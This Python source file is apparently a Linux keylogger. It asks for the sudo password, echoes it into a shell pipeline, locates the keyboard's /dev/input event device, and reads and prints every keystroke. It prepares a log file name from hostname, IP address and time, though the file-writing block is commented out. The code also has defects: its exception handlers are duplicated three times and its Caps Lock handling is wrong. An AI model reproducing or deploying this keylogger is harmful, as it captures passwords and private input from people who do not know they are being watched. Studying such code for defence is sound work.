import datetime
import os
import struct
import subprocess
import getpass
import difflib
import sys
import socket

KEY_DICTIONARY_MAP = {
    # event_code : (uppercase_key : lowercase_key)
    1: ('ESC', 'esc'),
    2: ('!', '1'),
    3: ('@', '2'),
    4: ('#', '3'),
    5: ('$', '4'),
    6: ('%', '5'),
    7: ('^', '6'),
    8: ('&', '7'),
    9: ('*', '8'),
    10: ('(', '9'),
    11: (')', '0'),
    12: ('_', '-'),
    13: ('+', '='),
    14: ('BACKSPACE', 'backspace'),
    15: ('TAB', 'tab'),
    16: ('Q', 'q'),
    17: ('W', 'w'),
    18: ('E', 'e'),
    19: ('R', 'r'),
    20: ('T', 't'),
    21: ('Y', 'y'),
    22: ('U', 'u'),
    23: ('I', 'i'),
    24: ('O', 'o'),
    25: ('P', 'p'),
    26: ('[', '{'),
    27: (']', '}'),
    28: ('ENTER', 'enter'),
    29: ('LEFTCTRL', 'leftctrl'),
    30: ('A', 'a'),
    31: ('S', 's'),
    32: ('D', 'd'),
    33: ('F', 'f'),
    34: ('G', 'g'),
    35: ('H', 'h'),
    36: ('J', 'j'),
    37: ('K', 'k'),
    38: ('L', 'l'),
    39: (';', ':'),
    40: ("'", "\""),
    41: ('``', '~'),
    42: ('LEFTSHIFT', 'leftshift'),
    43: ('\\', '|'),
    44: ('Z', 'z'),
    45: ('X', 'x'),
    46: ('C', 'c'),
    47: ('V', 'v'),
    48: ('B', 'b'),
    49: ('N', 'n'),
    50: ('M', 'm'),
    51: (',', '<'),
    52: ('.', '>'),
    53: ('/', '?'),
    54: ('RIGHTSHIFT', 'rightshift'),
    55: ('*', '*'),  # For numeric keypad
    56: ('LEFTALT', 'leftalt'),
    57: (' ', ' '),
    58: ('CAPSLOCK', 'capslock'),
    59: ('F1', 'f1'),
    60: ('F2', 'f2'),
    61: ('F3', 'f3'),
    62: ('F4', 'f4'),
    63: ('F5', 'f5'),
    64: ('F6', 'f6'),
    65: ('F7', 'f7'),
    66: ('F8', 'f8'),
    67: ('F9', 'f9'),
    68: ('F10', 'f10'),
    69: ('NUM_LOCK', 'num_lock'),
    70: ('SCROLL_LOCK', 'scroll_lock'),
    71: ('HOME', 'keypad_7'),
    72: ('keypad_KEY_UP', 'keypad_8'),
    73: ('keypad_PAGE_UP', 'keypad_9'),
    74: ('keypad_minus', 'keypad_minus'),
    75: ('keypad_KEY_LEFT', 'keypad_4'),
    76: ('keypad_5', 'keypad_5'),
    77: ('keypad_KEY_RIGHT', 'keypad_6'),
    78: ('keypad_+', 'keypad_+'),
    79: ('keypad_END', 'keypad_1'),
    80: ('keypad_KEY_DOWN', 'keypad_2'),
    81: ('keypad_PAGE_DOWN', 'keypad_3'),
    82: ('keypad_INSERT', 'keypad_0'),
    83: ('keypad_DELETE', 'keypad_dot'),
    85: ('ZENKAKUHANKAKU', 'zenkakuhankaku'),
    86: ('102ND', '102nd'),
    87: ('F11', 'f11'),
    88: ('F12', 'f12'),
    89: ('RO', 'ro'),
    90: ('KATAKANA', 'katakana'),
    91: ('HIRAGANA', 'hiragana'),
    92: ('HENKAN', 'henkan'),
    93: ('KATAKANAHIRAGANA', 'katakanahiragana'),
    94: ('MUHENKAN', 'muhenkan'),
    95: ('、', '、'),
    96: ('keypad_ENTER', 'keypad_ENTER'),
    97: ('RIGHTCTRL', 'rightctrl'),
    98: ('keypad_SLASH', 'keypad_SLASH'),
    99: ('SYSRQ', 'sysrq'),
    100: ('RIGHTALT', 'rightalt'),
    102: ('HOME', 'home'),
    103: ('UP', 'up'),
    104: ('PAGEUP', 'pageup'),
    105: ('LEFT', 'left'),
    106: ('RIGHT', 'right'),
    107: ('END', 'end'),
    108: ('DOWN', 'down'),
    109: ('PAGEDOWN', 'pagedown'),
    110: ('INSERT', 'insert'),
    111: ('DELETE', 'delete'),
    113: ('MUTE', 'mute'),
    114: ('VOLUMEDOWN', 'volumedown'),
    115: ('VOLUMEUP', 'volumeup'),
    116: ('POWER', 'power'),
    117: ('KPEQUAL', 'kpequal'),
    119: ('PAUSE', 'pause'),
    121: ('KPCOMMA', 'kpcomma'),
    122: ('HANGUEL', 'hanguel'),
    123: ('HANJA', 'hanja'),
    124: ('YEN', 'yen'),
    125: ('LEFTMETA', 'leftmeta'),
    126: ('RIGHTMETA', 'rightmeta'),
    127: ('COMPOSE', 'compose'),
    128: ('STOP', 'stop'),
    129: ('AGAIN', 'again'),
    130: ('PROPS', 'props'),
    131: ('UNDO', 'undo'),
    132: ('FRONT', 'front'),
    133: ('COPY', 'copy'),
    134: ('OPEN', 'open'),
    135: ('PASTE', 'paste'),
    136: ('FIND', 'find'),
    137: ('CUT', 'cut'),
    138: ('HELP', 'help'),
    183: ('F13', 'f13'),
    184: ('F14', 'f14'),
    185: ('F15', 'f15'),
    186: ('F16', 'f16'),
    187: ('F17', 'f17'),
    188: ('F18', 'f18'),
    189: ('F19', 'f19'),
    190: ('F20', 'f20'),
    191: ('F21', 'f21'),
    192: ('F22', 'f22'),
    193: ('F23', 'f23'),
    194: ('F24', 'f24'),
    240: ('UNKNOWN', 'unknown')
}

if __name__ == '__main__':
    # Initialize Variables
    event = ""

    # Get the sudo password from the user
    sudo_password = getpass.getpass("[+] Enter your sudo password: ")

    # Running the command to find which eventX is the keyboard from /dev/input
    command = "sudo -S cat /proc/bus/input/devices | grep \"Handlers=sysrq kbd\""

    # a) Use subprocess to run the sudo command
    try:
        result = subprocess.run(f"echo '{sudo_password}' | {command}",
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                text=True)

        if result.returncode == 0:
            print("[+] Command executed successfully!")
            lines = result.stdout.splitlines()

            # Get the first occurrence of the line for a keyboard event
            for line in lines:
                if "mouse" in line:
                    continue

                # Parse the keyboard event line for the event number: "eventX"
                parsed_line = line.strip().split(" ")
                closest_match = difflib.get_close_matches("event", parsed_line, n=1, cutoff=0.6)

                if closest_match:
                    index = parsed_line.index(closest_match[0])
                    print(f"[+] Keyboard event found in: {closest_match[0]}")
                    event = parsed_line[index]
                else:
                    sys.exit("[+] ERROR: No keyboard device has been found! (Now terminating program...)")
                break
        else:
            sys.exit("[+] ERROR: The command has failed! (Now terminating program...)")

    except subprocess.CalledProcessError as e:
        print("[+] ERROR: An error has occurred while running the command: ", e)

    # b) Get date and host information (for appending to .txt file name)
    current_datetime = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    file_name = f"{hostname}_{ip_address}_{current_datetime}.txt"  # Format: {Hostname}_{IP_addr}_{Date}_{Time}

    # c) Create a new .txt file to record and log keystrokes (with rwx permissions)
    #     try:
    #         with open(file_name, "w") as file:
    #             pass
    #         os.chmod(f"{file_name}", 0o777)
    #         print(f"[+] FILE CREATED: File '{file_name}' has been created successfully.")
    #     except IOError as e:
    #         print(f"[+] ERROR: An error has occurred while creating .txt file: {e}")

    # d) Opening the "/dev/input/eventX" file in the read-binary mode
    try:
        # Initialize a variable to track the Shift key state
        capitalized = False

        with open(f"/dev/input/{event}", "rb") as file:
            while True:
                # Event FORMAT: {timestamp, time_in_microseconds, event_type, event_code, event_value}
                event = file.read(24)
                _, _, event_type, event_code, event_value = struct.unpack("LLHHi", event)

                # If key press event, then event_type is 1
                if event_type == 1:
                    # Check if the event_code is in the dictionary
                    if event_code in KEY_DICTIONARY_MAP:
                        (uppercase_key, lowercase_key) = KEY_DICTIONARY_MAP[event_code]

                        # CASE: Handle uppercase and lowercase keys
                        # Left-shift key (42), Right-shift key (54) or CAPS_LOCK (58)
                        if event_code == 42 or event_code == 54 or event_code == 58:
                            capitalized = (event_value == 1)
                        else:
                            if capitalized:
                                char_pressed = uppercase_key
                            else:
                                char_pressed = lowercase_key
                            print(char_pressed)
                    else:
                        print(f"[+] Key code {event_code} not mapped to a character")

    except IOError as e:
        sys.exit(f"[+] ERROR: An error has occurred while reading the event file: {e}")
    except KeyboardInterrupt:
        sys.exit("[+] ERROR: KeyboardInterrupt was called! (Now terminating program...)")

    except IOError as e:
        sys.exit(f"[+] ERROR: An error has occurred while reading the event file: {e}")
    except KeyboardInterrupt:
        sys.exit("[+] ERROR: KeyboardInterrupt was called! (Now terminating program...)")

    except IOError as e:
        sys.exit(f"[+] ERROR: An error has occurred while reading the event file: {e}")
    except KeyboardInterrupt:
        sys.exit("[+] ERROR: KeyboardInterrupt was called! (Now terminating program...)")
